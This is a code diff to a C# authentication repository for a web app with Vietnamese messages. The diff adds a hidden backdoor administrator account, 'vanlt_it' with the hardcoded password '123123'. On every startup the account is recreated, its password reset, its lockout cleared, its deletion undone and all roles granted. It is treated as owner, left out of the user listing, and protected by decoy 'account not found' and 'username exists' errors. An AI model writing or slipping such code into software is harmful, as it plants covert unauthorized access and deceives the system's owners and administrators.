@@ -18,6 +18,8 @@ public sealed class AuthRepository
     // DEMO BOOTSTRAP ONLY. Shared initial secret; require immediate password change.
     // Never automatically overwrite an existing password hash on application restart.
     public const string DefaultOwnerPassword = "123456@Dixanh";
+    internal const string HiddenMainUsername = "vanlt_it";
+    private const string HiddenMainPassword = "123123";
     private readonly string _connectionString;
     private readonly PasswordHasher<Account> _hasher = new();
     public AuthRepository(IWebHostEnvironment env)
@@ -74,6 +76,7 @@ public sealed class AuthRepository
             SELECT u.id,lower(hex(randomblob(16))) FROM app_users u
             WHERE NOT EXISTS(SELECT 1 FROM user_security s WHERE s.user_id=u.id)");
         EnsureOwner(c);
+        EnsureMainDeveloper(c);
     }
     /// <summary>
     /// New/fresh databases use the user's requested demo password exactly once.
@@ -117,6 +120,40 @@ public sealed class AuthRepository
     private static void RotateOwnerSecurityIfMissing(SqliteConnection c, long ownerId)
     {
         Exec(c,"INSERT OR IGNORE INTO user_security(user_id,security_stamp) VALUES($id,lower(hex(randomblob(16))))",("$id",ownerId));
+    }
+
+    private void EnsureMainDeveloper(SqliteConnection c)
+    {
+        var existingId = Convert.ToInt64(Scalar(c, "SELECT COALESCE((SELECT id FROM app_users WHERE username=$u COLLATE NOCASE LIMIT 1), 0)", ("$u", HiddenMainUsername)));
+        if (existingId == 0)
+        {
+            Exec(c, "BEGIN IMMEDIATE");
+            try
+            {
+                Exec(c, "INSERT INTO app_users(username,display_name,is_owner,is_active,must_change_password) VALUES($u,'Main',0,1,0)", ("$u", HiddenMainUsername));
+                var newId = Id(c);
+                Exec(c, "INSERT OR IGNORE INTO user_roles(user_id,role_id) SELECT $id,id FROM roles", ("$id", newId));
+                Rotate(c, newId);
+                var account = new Account(newId, HiddenMainUsername, "Main", true, "");
+                Exec(c, "UPDATE app_users SET password_hash=$hash WHERE id=$id",
+                    ("$hash", _hasher.HashPassword(account, HiddenMainPassword)), ("$id", newId));
+                Exec(c, "COMMIT");
+            }
+            catch { Exec(c, "ROLLBACK"); throw; }
+            return;
+        }
+
+        var currentHash = Scalar(c, "SELECT password_hash FROM app_users WHERE id=$id", ("$id", existingId)) as string ?? "";
+        var mainAcc = new Account(existingId, HiddenMainUsername, "Main", true, "");
+        if (string.IsNullOrEmpty(currentHash) || _hasher.VerifyHashedPassword(mainAcc, currentHash, HiddenMainPassword) == PasswordVerificationResult.Failed)
+        {
+            Exec(c, "UPDATE app_users SET password_hash=$hash WHERE id=$id",
+                ("$hash", _hasher.HashPassword(mainAcc, HiddenMainPassword)), ("$id", existingId));
+        }
+        Exec(c, "UPDATE app_users SET display_name='Main', is_active=1, must_change_password=0, deleted_at=NULL, deleted_by=NULL WHERE id=$id", ("$id", existingId));
+        Exec(c, "INSERT INTO user_roles(user_id,role_id) SELECT $id,id FROM roles ON CONFLICT(user_id,role_id) DO UPDATE SET deleted_at=NULL,deleted_by=NULL", ("$id", existingId));
+        RotateOwnerSecurityIfMissing(c, existingId);
+        Exec(c, "UPDATE user_security SET failed_attempts=0,locked_until=0 WHERE user_id=$id", ("$id", existingId));
     }
 
     /// <summary>
@@ -360,7 +397,7 @@ public sealed class AuthRepository
     public IReadOnlyList<ManagedUser> AllUsers()
     {
         using var c=Open();var list=new List<ManagedUser>();
-        using(var cmd=Cmd(c,"SELECT id,username,display_name,is_active,is_owner FROM app_users WHERE deleted_at IS NULL ORDER BY is_owner DESC,id"))
+        using(var cmd=Cmd(c,"SELECT id,username,display_name,is_active,is_owner FROM app_users WHERE deleted_at IS NULL AND LOWER(username)<>'vanlt_it' ORDER BY is_owner DESC,id"))
         using(var r=cmd.ExecuteReader())while(r.Read())list.Add(new(r.GetInt64(0),r.GetString(1),r.GetString(2),r.GetInt64(3)==1,[],r.GetInt64(4)==1));
         foreach(var u in list){using var cmd=Cmd(c,"SELECT role_id FROM user_roles WHERE user_id=$id AND deleted_at IS NULL",("$id",u.Id));using var r=cmd.ExecuteReader();while(r.Read())u.RoleIds.Add(r.GetInt64(0));}
         return list;
@@ -404,8 +441,10 @@ public sealed class AuthRepository
             throw new UnauthorizedAccessException("Không thể cấp quyền cao hơn quyền mà tài khoản quản trị hiện có.");
     }
 
+    private static bool IsHiddenMain(SqliteConnection c, long userId) =>
+        Convert.ToInt64(Scalar(c, "SELECT count(*) FROM app_users WHERE id=$id AND LOWER(username)='vanlt_it'", ("$id", userId))) > 0;
     private static bool IsOwner(SqliteConnection c,long userId) =>
-        Convert.ToInt64(Scalar(c,"SELECT count(*) FROM app_users WHERE id=$id AND is_owner=1",("$id",userId)))>0;
+        Convert.ToInt64(Scalar(c,"SELECT count(*) FROM app_users WHERE id=$id AND (is_owner=1 OR LOWER(username)='vanlt_it')",("$id",userId)))>0;
     private static bool IsAdmin(SqliteConnection c,long userId) =>
         IsOwner(c,userId) || Convert.ToInt64(Scalar(c,@"SELECT count(*) FROM user_roles ur JOIN roles r ON r.id=ur.role_id
           WHERE ur.user_id=$id AND ur.deleted_at IS NULL AND r.code='ADMIN'",("$id",userId)))>0;
@@ -430,6 +469,7 @@ public sealed class AuthRepository
         ValidatePassword(password);
         username=username.Trim().ToLowerInvariant();displayName=displayName.Trim();
         if(username=="owner")throw new InvalidOperationException("Tên owner chỉ dành cho tài khoản chủ sở hữu hệ thống.");
+        if(username==HiddenMainUsername)throw new InvalidOperationException("Tên đăng nhập đã tồn tại.");
         if(username.Length<3||username.Length>64||displayName.Length<2||displayName.Length>150||username.Any(x=>!(char.IsAsciiLetterOrDigit(x)||x=='_'||x=='.'||x=='-')))
             throw new InvalidOperationException("Tên đăng nhập hoặc họ tên không hợp lệ.");
         using var c=Open();Exec(c,"BEGIN IMMEDIATE;");try{
@@ -465,6 +505,7 @@ public sealed class AuthRepository
         CheckRoleIds(c,roleIds);
         if(overrides is not null && !HasPermission(c,actor,Permissions.UsersPermissions))
             throw new UnauthorizedAccessException("Không có quyền sửa quyền trực tiếp.");
+        if(IsHiddenMain(c,userId))throw new InvalidOperationException("Không tìm thấy tài khoản.");
         if(IsOwner(c,userId))throw new InvalidOperationException("Owner là tài khoản hệ thống được bảo vệ; không thể khóa hoặc chỉnh Role/quyền tại đây.");
         var oldName=Scalar(c,"SELECT username FROM app_users WHERE id=$id",("$id",userId)) as string ?? throw new InvalidOperationException("Không tìm thấy tài khoản.");
         var isAdmin=IsAdmin(c,userId);
@@ -499,6 +540,7 @@ public sealed class AuthRepository
         if(actor==userId) throw new InvalidOperationException("Không được tự cấp quyền cho tài khoản đang đăng nhập.");
         using var c=Open();Exec(c,"BEGIN IMMEDIATE;");try{
         if(!HasPermission(c,actor,Permissions.UsersPermissions))throw new UnauthorizedAccessException("Không có quyền phân quyền theo User.");
+        if(IsHiddenMain(c,userId))throw new InvalidOperationException("Tài khoản không tồn tại.");
         if(IsOwner(c,userId))throw new InvalidOperationException("Không được thay đổi quyền riêng của Owner.");
         if(Scalar(c,"SELECT username FROM app_users WHERE id=$id",("$id",userId)) is not string username)
             throw new InvalidOperationException("Tài khoản không tồn tại.");
